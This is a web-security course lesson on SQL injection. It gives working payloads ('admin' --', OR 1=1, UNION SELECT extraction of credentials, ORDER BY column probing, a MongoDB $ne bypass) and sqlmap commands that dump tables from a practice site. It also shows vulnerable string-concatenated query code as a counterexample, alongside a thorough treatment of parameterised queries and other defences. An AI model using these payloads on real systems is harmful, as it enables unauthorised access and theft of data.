# SQL Injection

If XSS is the most famous *client-side* bug, **SQL injection (SQLi)** is its server-side counterpart — and arguably the single most damaging vulnerability class in web history, responsible for some of the largest data breaches ever recorded.

## The core idea

Applications build database queries by combining fixed SQL with user input. If that input isn't properly separated from the query structure, an attacker can inject their own SQL logic — making the database do things the developer never intended.

```python
# VULNERABLE — user input concatenated directly into the query:
username = request.form["username"]
password = request.form["password"]
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
cursor.execute(query)
```

If an attacker enters this as the username:

```
admin' --
```

The resulting query becomes:

```sql
SELECT * FROM users WHERE username='admin' --' AND password='anything'
```

In SQL, `--` starts a comment — everything after it is ignored. The password check is entirely erased. The attacker logs in as `admin` with **no valid password at all**.

## The classic OR 1=1 bypass

Another timeless classic:

```
username: ' OR '1'='1
password: ' OR '1'='1
```

```sql
SELECT * FROM users WHERE username='' OR '1'='1' AND password='' OR '1'='1'
```

Since `'1'='1'` is always true, this query matches **every row in the table** — the application typically just logs the attacker in as whichever user happens to be returned first.

## Beyond login bypass — reading the entire database

SQLi isn't limited to authentication bypass. Using **UNION-based injection**, an attacker can extract arbitrary data:

```sql
-- Original intended query:
SELECT name, price FROM products WHERE category = 'shoes'

-- Attacker input for category:
' UNION SELECT username, password FROM users --
```

```sql
SELECT name, price FROM products WHERE category = '' UNION SELECT username, password FROM users --'
```

The application, expecting to display product names and prices, now unknowingly displays **every username and password hash in the database**, formatted exactly like product listings.

## The main SQLi techniques

| Technique | How it works |
|---|---|
| **In-band / UNION-based** | Attacker directly sees the injected data in the app's normal response (as above). |
| **Error-based** | Deliberately triggers database errors that leak data in the error message itself. |
| **Boolean-based blind** | No data is shown directly, but the app behaves differently (different page content) based on true/false conditions the attacker injects — data is extracted one bit at a time by asking yes/no questions. |
| **Time-based blind** | Even less feedback — the attacker injects a conditional `SLEEP(5)` and infers true/false purely from **how long the response takes**. |
| **Out-of-band** | Data is exfiltrated via a completely different channel (e.g., triggering a DNS lookup to an attacker-controlled domain containing stolen data in the subdomain). |

Blind and time-based techniques are slower (extracting data byte-by-byte) but devastatingly effective when no direct output is available — this is exactly what makes automated tools essential in practice.

## Automated discovery — sqlmap

Manually crafting time-based blind payloads byte-by-byte is tedious; **sqlmap** (mentioned back in Path 04.5) automates the entire process:

```bash
# Basic scan against a URL parameter:
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --batch

# Testing a POST request captured from Burp:
sqlmap -r request.txt --batch

# Once a vulnerability is confirmed, enumerate databases:
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs

# Dump a specific table:
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D testdb -T users --dump
```

sqlmap supports every technique above, handles different database engines (MySQL, PostgreSQL, MSSQL, Oracle, SQLite), and even offers advanced options like reading/writing files on the underlying server or spawning an OS shell in favourable configurations.

## Manual testing approach

Before reaching for sqlmap, understand the basics manually — it's far more educational and often faster for simple cases:

1. Find a parameter that likely touches a database query (search boxes, ID parameters, filters, login forms).
2. Try a single quote `'` — if you get a **database error** in the response, that's a strong signal of injectability.
3. Try `' OR '1'='1` and `' OR '1'='1' --` to test for authentication bypass scenarios.
4. For UNION-based testing, first determine the number of columns:

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   -- keep incrementing until you get an error; that tells you the column count
```

5. Then build your UNION SELECT matching that column count:

```sql
' UNION SELECT NULL, NULL, NULL --
' UNION SELECT username, password, NULL FROM users --
```

## The actual fix — parameterised queries

The definitive, industry-standard defence is **never** building SQL by string concatenation. Instead, use **parameterised queries (prepared statements)**, where user input is passed *separately* from the query structure — the database driver handles safe substitution, making injection structurally impossible for that query.

```python
# SAFE — parameterised query:
username = request.form["username"]
password = request.form["password"]
cursor.execute(
    "SELECT * FROM users WHERE username = %s AND password = %s",
    (username, password)
)
```

The database now treats `username` and `password` purely as **data values**, never as executable SQL syntax — no matter what the attacker types, it can never break out of being "just a string."

```python
# Same idea, in a typical ORM (SQLAlchemy example):
user = session.query(User).filter_by(username=username, password_hash=hash_pw(password)).first()
```

Modern ORMs (Object-Relational Mappers) use parameterised queries under the hood by default — another reason SQLi, while still extremely common, is somewhat rarer in modern framework-based codebases than it was in the hand-rolled SQL era.

## Defence in depth beyond parameterisation

- **Least privilege database accounts** — the application's DB user shouldn't have permission to drop tables or read unrelated databases, limiting blast radius even if injection somehow occurs.
- **Input validation** — reject obviously malformed input as an additional layer (not a replacement for parameterisation).
- **WAF (Web Application Firewall)** — can catch and block many common SQLi patterns, though sophisticated attackers routinely find bypasses (never rely on WAF alone).
- **ORMs used correctly** — but beware of "raw query" escape hatches many ORMs still offer, which reintroduce the exact same risk if used carelessly.

:::danger EVEN "SAFE" ORMS CAN BE MISUSED
```python
# Still vulnerable, even using an ORM's raw query feature:
User.objects.raw(f"SELECT * FROM users WHERE username = '{username}'")
```
Using an ORM doesn't automatically guarantee safety — string-formatting your way into any "raw SQL" escape hatch reintroduces the exact same vulnerability. The safety comes from parameterisation, not from which library you're using.
:::

## Second-order SQLi — the delayed detonation

Every example so far assumes the injected input reaches the database in the *same request* where it's typed. **Second-order SQLi** is subtler: the malicious input is safely stored on first submission (perhaps even correctly escaped at that point), but later gets pulled out of the database and used, unsafely, to build a *different* query — for example, a username containing injection syntax is stored cleanly during registration, then used unsanitised months later when an admin panel builds a "recent activity for this user" report. This delay between injection and detonation makes second-order SQLi genuinely hard to spot with straightforward single-request testing, since the vulnerable query never appears anywhere near the form that actually introduced the malicious data.

## NoSQL injection — same idea, different syntax

Databases like MongoDB don't use SQL at all, but they're not immune to the same underlying class of bug — just with a different injection syntax. Where an app builds a MongoDB query directly from user-supplied JSON, an attacker can sometimes inject a query *operator* instead of a plain value:

```json
// Intended: {"username": "alice", "password": "hunter2"}
// Attacker sends instead:
{"username": "alice", "password": {"$ne": null}}
```

`$ne` (not-equal) is a legitimate MongoDB query operator — if the backend blindly passes the parsed JSON body into a query, `{"$ne": null}` matches *any* non-null password, authenticating as Alice with no valid password at all. The root cause is identical to classic SQLi — untrusted input treated as query structure instead of pure data — which is exactly why the fix is the same underlying principle: validate and strictly type incoming data rather than passing it straight through to the query layer.

## 🧪 Lab — PortSwigger SQLi labs + sqlmap practice

1. Work through [PortSwigger's SQL injection labs](https://portswigger.net/web-security/sql-injection) — start with the login bypass labs, then move to UNION-based data extraction.
2. Against `testphp.vulnweb.com` (a legal target deliberately built with SQLi flaws), try manual testing first with Burp Repeater, then confirm and automate with sqlmap:

```bash
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --batch --dbs
```

3. Compare what sqlmap found automatically to what you found manually — this comparison is genuinely instructive about both the tool's power and its limits.

:::challenge Test yourself
Why is a parameterised query fundamentally safer than "carefully sanitising" user input by stripping out dangerous characters like quotes before concatenating it into a SQL string?

<details><summary>Show answer</summary>Sanitisation/blocklisting tries to <em>predict every dangerous pattern</em> in advance — and attackers routinely find encoding tricks, alternate syntax, or edge cases that slip past incomplete filters. Parameterised queries instead make the database engine itself treat the input as <strong>pure data, never as executable SQL syntax</strong>, structurally — there's no filter to bypass because the input can never be interpreted as code in the first place, regardless of its content.</details>
:::

## Key terms

- **SQL injection (SQLi)** — attacker-controlled input alters the structure/logic of a database query.
- **UNION-based / error-based / blind (boolean, time) / out-of-band** — the main SQLi extraction techniques.
- **sqlmap** — the industry-standard automated SQLi detection and exploitation tool.
- **Parameterised query / prepared statement** — the definitive defence, separating query structure from data.

## Recap

- SQLi lets attackers alter query logic, bypass authentication, or extract entire databases.
- Techniques range from directly visible (UNION-based) to fully blind (time-based).
- sqlmap automates detection and exploitation across every major database engine.
- The real fix is parameterised queries — never string-concatenate user input into SQL.
- Even ORMs can be misused via raw-query escape hatches — the fix is architectural, not tool-dependent.

???refs
- [PortSwigger — SQL injection](https://portswigger.net/web-security/sql-injection) — the definitive free hands-on resource.
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [sqlmap documentation](https://github.com/sqlmapproject/sqlmap/wiki) — official usage guide.
- [testphp.vulnweb.com](http://testphp.vulnweb.com/) — legal practice target with real SQLi flaws.
???

**Next up →** [Business Logic Vulnerabilities](#/lesson/11-web-security/business-logic-vulnerabilities)
